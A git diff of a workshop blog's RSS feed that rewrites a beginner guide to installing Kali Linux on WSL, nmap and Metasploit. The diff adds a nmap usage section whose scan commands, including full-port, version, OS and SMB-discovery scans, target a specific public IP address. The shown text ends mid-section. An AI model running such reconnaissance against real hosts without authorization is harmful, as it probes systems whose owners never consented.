@@ -6,59 +6,72 @@
     <description>Recent content in Posts on Workshops</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 31 May 2023 18:46:26 +0200</lastBuildDate><atom:link href="https://busterwarn.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 12 Jun 2023 08:00:00 +0200</lastBuildDate><atom:link href="https://busterwarn.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Setting up penetration testing tools.</title>
-      <link>https://busterwarn.github.io/posts/setup_pentest_tools/</link>
-      <pubDate>Wed, 31 May 2023 18:46:26 +0200</pubDate>
+      <title>About</title>
+      <link>https://busterwarn.github.io/posts/about/</link>
+      <pubDate>Mon, 12 Jun 2023 08:00:00 +0200</pubDate>
       
-      <guid>https://busterwarn.github.io/posts/setup_pentest_tools/</guid>
-      <description>Some Introduction In penetration testing, a lot of different tools are used. For our purposes, we&amp;rsquo;re going to be satisfied using nmap and metasploit.
-This guide is going to show you some alternative ways of installing these tools. They are usually accessed from a Kali Linux distribution. This Kali Linux can be easily be setup from your Windows 10 or 11 with Windows Subsystem for Linux (WSL).
-Kali Linux Kali Linux is a penetration testing linux distribution often used for penetration testing.</description>
-      <content>&lt;h1 id=&#34;some-introduction&#34;&gt;Some Introduction&lt;/h1&gt;
-&lt;p&gt;In penetration testing, a lot of different tools are used. For our purposes, we&amp;rsquo;re going to be satisfied using &lt;a href=&#34;https://nmap.org/&#34;&gt;nmap&lt;/a&gt; and &lt;a href=&#34;https://www.metasploit.com/&#34;&gt;metasploit&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;This guide is going to show you some alternative ways of installing these tools. They are usually accessed from a Kali Linux distribution. This Kali Linux can be easily be setup from your Windows 10 or 11 with &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/wsl/about&#34;&gt;Windows Subsystem for Linux (WSL)&lt;/a&gt;.&lt;/p&gt;
+      <guid>https://busterwarn.github.io/posts/about/</guid>
+      <description>Nothing here =)</description>
+      <content>&lt;p&gt;Nothing here =)&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Setting up Penetration Testing Tools</title>
+      <link>https://busterwarn.github.io/posts/hacking_workshop/setup_pentest_tools/</link>
+      <pubDate>Mon, 12 Jun 2023 08:00:00 +0200</pubDate>
+      
+      <guid>https://busterwarn.github.io/posts/hacking_workshop/setup_pentest_tools/</guid>
+      <description>Introduction In penetration testing, a wide range of tools are used. For our purposes, we&amp;rsquo;ll be focusing these two: nmap and Metasploit.
+This guide will demonstrate how to install these tools, particularly through the Kali Linux distribution. Kali Linux can be easily set up on Windows 10 or 11 using the Windows Subsystem for Linux (WSL).
+Kali Linux Kali Linux is a Linux distribution specifically designed for penetration testing. It comes pre-installed with many standard tools required for this purpose.</description>
+      <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;In penetration testing, a wide range of tools are used. For our purposes, we&amp;rsquo;ll be focusing these two: &lt;a href=&#34;https://nmap.org/&#34;&gt;nmap&lt;/a&gt; and &lt;a href=&#34;https://www.metasploit.com/&#34;&gt;Metasploit&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;This guide will demonstrate how to install these tools, particularly through the Kali Linux distribution. Kali Linux can be easily set up on Windows 10 or 11 using the &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/wsl/about&#34;&gt;Windows Subsystem for Linux (WSL)&lt;/a&gt;.&lt;/p&gt;
 &lt;h2 id=&#34;kali-linux&#34;&gt;Kali Linux&lt;/h2&gt;
-&lt;p&gt;Kali Linux is a penetration testing linux distribution often used for penetration testing. It have many standard tools already installed.&lt;/p&gt;
+&lt;p&gt;Kali Linux is a Linux distribution specifically designed for penetration testing. It comes pre-installed with many standard tools required for this purpose.&lt;/p&gt;
 &lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
-&lt;p&gt;Nmap is an enumeration tool, used to enumerate through ip addresses and ports. The goal here is often to find out what attack surface you have on a target.&lt;/p&gt;
+&lt;p&gt;Nmap is an enumeration tool used to scan IP addresses and ports. Its primary objective is to identify the attack surface of a target.&lt;/p&gt;
 &lt;h2 id=&#34;metasploit&#34;&gt;Metasploit&lt;/h2&gt;
-&lt;p&gt;Metasploit (msfconsole??) is a command line tool that contains a lot of vulnerabilities that are easy to use. It got everything from auxiliary scanners to working vulnerabilities you can use to exploit different servers.&lt;/p&gt;
+&lt;p&gt;Metasploit, specifically msfconsole, is a command-line tool that provides a wide range of vulnerabilities. It includes auxiliary scanners as well as working vulnerabilities that can be exploited on various servers.&lt;/p&gt;
 &lt;h1 id=&#34;installation-guide&#34;&gt;Installation Guide&lt;/h1&gt;
-&lt;h2 id=&#34;kali-linux-on-wsl-for-windows-10--11&#34;&gt;Kali Linux on WSL for Windows 10 / 11&lt;/h2&gt;
-&lt;p&gt;There are many ways to get access to these tools on your computer. We recommend that you install WSL with Kali Linux, either with a &lt;a href=&#34;#getting-a-kali-linux-gui&#34;&gt;GUI&lt;/a&gt; or the more &lt;a href=&#34;#install-wsl-with-kali-linux&#34;&gt;regular way&lt;/a&gt; and accessing Kali from a terminal interface. Both ways are described below.&lt;/p&gt;
-&lt;h3 id=&#34;some-common-problems&#34;&gt;Some common problems.&lt;/h3&gt;
-&lt;p&gt;Make sure you that you run powershell as administrator before you start installing.&lt;/p&gt;
+&lt;h2 id=&#34;installing-kali-linux-on-wsl-for-windows-1011&#34;&gt;Installing Kali Linux on WSL for Windows 10/11&lt;/h2&gt;
+&lt;p&gt;There are several methods to access these tools on your computer. We recommend installing WSL with Kali Linux either with a &lt;a href=&#34;#getting-a-kali-linux-gui&#34;&gt;GUI&lt;/a&gt; or the &lt;a href=&#34;#install-wsl-with-kali-linux&#34;&gt;regular way&lt;/a&gt; and accessing Kali from a terminal interface. Both methods are described below.&lt;/p&gt;
+&lt;h3 id=&#34;common-issues&#34;&gt;Common Issues&lt;/h3&gt;
+&lt;p&gt;Ensure that you run PowerShell as an administrator before starting the installation.&lt;/p&gt;
 
-  &lt;img src=&#34;resources/_gen/images/run_powershell_as_admin.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+  &lt;img src=&#34;images/run_powershell_as_admin.png&#34;  class=&#34;left&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
 
 
-&lt;p&gt;A problem you might run into is that you need to enable hardware virtualization&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/about/&#34;&gt;https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/about/&lt;/a&gt;
-&lt;a href=&#34;https://support.microsoft.com/en-us/windows/enable-virtualization-on-windows-11-pcs-c5578302-6e43-4b4b-a449-8ced115f58e1&#34;&gt;https://support.microsoft.com/en-us/windows/enable-virtualization-on-windows-11-pcs-c5578302-6e43-4b4b-a449-8ced115f58e1&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;install-kali-linux&#34;&gt;Install Kali Linux&lt;/h2&gt;
-&lt;p&gt;If you already have debian, ubuntu or some other linux machine set up, that should be sufficient. However Kali Linux is the usual distro for penetration testing so we will be installing this one.&lt;/p&gt;
-&lt;h3 id=&#34;install-wsl-with-kali-linux&#34;&gt;Install WSL with Kali Linux&lt;/h3&gt;
-&lt;p&gt;Instructions from kali.org: &lt;a href=&#34;https://www.kali.org/docs/wsl/wsl-preparations/&#34;&gt;https://www.kali.org/docs/wsl/wsl-preparations/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You might encounter an issue where hardware virtualization needs to be enabled. Refer to the following resources for more information:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/about/&#34;&gt;About Hyper-V on Windows&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://support.microsoft.com/en-us/windows/enable-virtualization-on-windows-11-pcs-c5578302-6e43-4b4b-a449-8ced115f58e1&#34;&gt;Enabling Virtualization on Windows 11&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;installing-kali-linux&#34;&gt;Installing Kali Linux&lt;/h2&gt;
+&lt;p&gt;If you already have Debian, Ubuntu, or another Linux distribution set up, that should be sufficient. However, Kali Linux is the recommended distribution for penetration testing, so we&amp;rsquo;ll be installing that.&lt;/p&gt;
+&lt;h3 id=&#34;installing-wsl-with-kali-linux&#34;&gt;Installing WSL with Kali Linux&lt;/h3&gt;
+&lt;p&gt;Follow the instructions provided on kali.org: &lt;a href=&#34;https://www.kali.org/docs/wsl/wsl-preparations/&#34;&gt;WSL Preparations&lt;/a&gt;&lt;/p&gt;
 &lt;h3 id=&#34;getting-a-kali-linux-gui&#34;&gt;Getting a Kali Linux GUI&lt;/h3&gt;
-&lt;p&gt;This video show some similar steps, it should be easy enough to follow.&lt;/p&gt;
+&lt;p&gt;The following video demonstrates similar steps that should be easy to follow:&lt;/p&gt;
 
 &lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
   &lt;iframe src=&#34;https://www.youtube.com/embed/UXyS-xofGNM&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
 &lt;/div&gt;
 
-&lt;h3 id=&#34;install-some-regular-dependencies&#34;&gt;Install some regular dependencies&lt;/h3&gt;
-&lt;p&gt;Kali Linux should come with a lot of tools fresh out of the box. But with WSL almost nothing will be installed. You might want to install some basic tools before starting:&lt;/p&gt;
+&lt;h3 id=&#34;installing-useful-dependencies&#34;&gt;Installing Useful Dependencies&lt;/h3&gt;
+&lt;p&gt;While Kali Linux comes with many tools pre-installed, WSL has minimal packages installed by default. It&amp;rsquo;s recommended to install some basic tools before getting started:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get update -y
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get upgrade -y
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install nmap -y
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install vim -y
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install git -y
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install vim -y     &lt;span style=&#34;color:#75715e&#34;&gt;# Not necessary&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install git -y     &lt;span style=&#34;color:#75715e&#34;&gt;# Not necessary&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install ruby-full  &lt;span style=&#34;color:#75715e&#34;&gt;# Required for Metasploit&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;install-nmap&#34;&gt;Install nmap&lt;/h2&gt;
-&lt;p&gt;From your now virtual (or real) kali linux, run the following command in terminal:&lt;/p&gt;
+&lt;p&gt;To install nmap on your Kali Linux (either virtual or real), run the following command in the terminal:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install nmap -y
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can test that it works by running &lt;code&gt;nmap google.com&lt;/code&gt; and getting something similar:&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can test if nmap is working by running &lt;code&gt;nmap google.com&lt;/code&gt; and checking the output:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nmap google.com
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.94 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2023-06-09 13:04 CEST
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; google.com &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;142.250.74.78&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
@@ -72,9 +85,153 @@ Kali Linux Kali Linux is a penetration testing linux distribution often used for
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 4.08 seconds
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;install-metasploit-framework&#34;&gt;Install Metasploit-Framework&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo git clone https://github.com/rapid7/metasploit-framework.git /etc/metasploit-framework
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo chown -R &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;whoami&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt; /etc/metasploit-framework
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+&lt;p&gt;Run the following command to install Metasploit-Framework:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install metasploit-framework postgresql -y
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After the installation is complete, you can open Metasploit-Framework. It will display some ASCII art at startup, and you should see the prompt &lt;code&gt;msf6&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               .;lxO0KXXXK0Oxl:.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           ,o0WMMMMMMMMMMMMMMMMMMKd,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; oMMMMMMMMMMx.                    dMMMMMMMMMMx
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.WMMMMMMMMM:                       :MMMMMMMMMM,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;xMMMMMMMMMo                         lMMMMMMMMMO
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;xMMMMMMMMMd                        ,0MMMMMMMMMMK;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.WMMMMMMMMMc                         &amp;#39;&lt;/span&gt;OMMMMMM0,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; lMMMMMMMMMMk.                         .kMMO&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  dMMMMMMMMMMWd&amp;#39;&lt;/span&gt;                         ..
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   cWMMMMMMMMMMMNxc&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.                ##########
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;      ;0MMMMMMMMMMMMMMMo.          +:+
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        .dNMMMMMMMMMMMMo          +#++:++#+
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;           &amp;#39;&lt;/span&gt;oOWMMMMMMMMo                +:+
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               .,cdkO0K;        :+:    :+:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                :::::::+:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                      Metasploit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt; metasploit v6.3.19-dev                          &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+ -- --&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2318&lt;/span&gt; exploits - &lt;span style=&#34;color:#ae81ff&#34;&gt;1215&lt;/span&gt; auxiliary - &lt;span style=&#34;color:#ae81ff&#34;&gt;412&lt;/span&gt; post       &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+ -- --&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1234&lt;/span&gt; payloads - &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; encoders - &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; nops           &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+ -- --&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; evasion                                       &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Metasploit tip: Use sessions -1 to interact with the
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;last opened session
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Metasploit Documentation: https://docs.metasploit.com/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msf6 &amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;user-guide&#34;&gt;User Guide&lt;/h1&gt;
+&lt;h2 id=&#34;using-nmap&#34;&gt;Using Nmap&lt;/h2&gt;
+&lt;p&gt;Nmap is a powerful tool with extensive functionality. In this guide, we will cover the basics.&lt;/p&gt;
+&lt;p&gt;By default, running nmap on any IP address will scan the 1,000 most common ports for each protocol.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap 217.114.85.70
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can specify which ports to scan. For example, to scan all possible ports:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -p1-65535 217.114.85.70
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Scanning all ports can take some time. To speed it up, you can use the &lt;code&gt;-n&lt;/code&gt; flag to disable DNS resolution:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -p1-65535 -n 217.114.85.70
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Another useful flag is &lt;code&gt;-A&lt;/code&gt; to &amp;ldquo;Enable OS detection, version detection, script scanning, and traceroute&amp;rdquo; providing valuable information:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -A 217.114.85.70
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;-sV&lt;/code&gt; is another useful flag: &amp;ldquo;Probe open ports to determine service/version info&amp;rdquo;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -sV 217.114.85.70
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Different flags can be combined to enhance scanning capabilities:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -sV -A -p1-65535 217.114.85.70
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nmap also offers various scripts that you can use. For example, if you have found a Windows server with an SMB port 445, you can use the &lt;code&gt;smb-os-discovery&lt;/code&gt; script to find out the exact version of Windows.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap --script&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;smb-os-discovery -p &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt; 217.114.85.70
